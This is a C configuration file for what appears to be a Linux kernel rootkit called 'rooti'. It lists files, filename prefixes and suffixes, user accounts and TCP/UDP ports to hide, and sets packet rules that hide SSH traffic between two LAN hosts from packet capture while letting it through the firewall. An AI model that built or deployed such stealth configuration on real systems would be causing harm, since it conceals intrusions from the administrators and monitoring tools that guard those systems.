#include <linux/in.h>
#include "utils.h"
#include "config.h"

const char *ROOTI_HIDDEN_FILES[] = {"hideme.txt", "dontshowme.txt"};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_FILES);

const char *ROOTI_HIDDEN_FILES_PREFIXES[] = {"secret_", "classified_"};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_FILES_PREFIXES);

const char *ROOTI_HIDDEN_FILES_SUFFIXES[] = {"_secret.txt", "_classified.txt"};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_FILES_SUFFIXES);

const char *ROOTI_HIDDEN_USERS[] = {"omri", "omre"};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_USERS);

const unsigned short ROOTI_HIDDEN_TCP_PORTS[] = {22, 2049};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_TCP_PORTS);

const unsigned short ROOTI_HIDDEN_UDP_PORTS[] = {161, 162};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_UDP_PORTS);

static struct rooti_net_rule ROOTI_PCAP_RULES[] = {
    { .saddr = { 0xc0a8016c, 0xFFFFFFFF }, .daddr = { 0xc0a8017d, 0xFFFFFFFF }, .protocol = IPPROTO_TCP, .dport = 22, .action = ROOTI_PACKET_DROP },
    { .saddr = { 0xc0a8017d, 0xFFFFFFFF }, .daddr = { 0xc0a8016c, 0xFFFFFFFF }, .protocol = IPPROTO_TCP, .sport = 22, .action = ROOTI_PACKET_DROP },
};

const struct rooti_net_policy ROOTI_PCAP_POLICY = {
    .type = ROOTI_NET_POLICY_BLACKLIST,
    .rules = ROOTI_PCAP_RULES,
    .len = ARRAY_SIZE(ROOTI_PCAP_RULES)
};

static struct rooti_net_rule ROOTI_FW_RULES[] = {
    { .saddr = { 0xc0a8016c, 0xFFFFFFFF }, .daddr = { 0xc0a8017d, 0xFFFFFFFF }, .protocol = IPPROTO_TCP, .dport = 22, .action = ROOTI_PACKET_ACCEPT },
    { .saddr = { 0xc0a8017d, 0xFFFFFFFF }, .daddr = { 0xc0a8016c, 0xFFFFFFFF }, .protocol = IPPROTO_TCP, .sport = 22, .action = ROOTI_PACKET_ACCEPT },
};

const struct rooti_net_policy ROOTI_FW_POLICY = {
    .type = ROOTI_NET_POLICY_BLACKLIST,
    .rules = ROOTI_FW_RULES,
    .len = ARRAY_SIZE(ROOTI_FW_RULES)
};
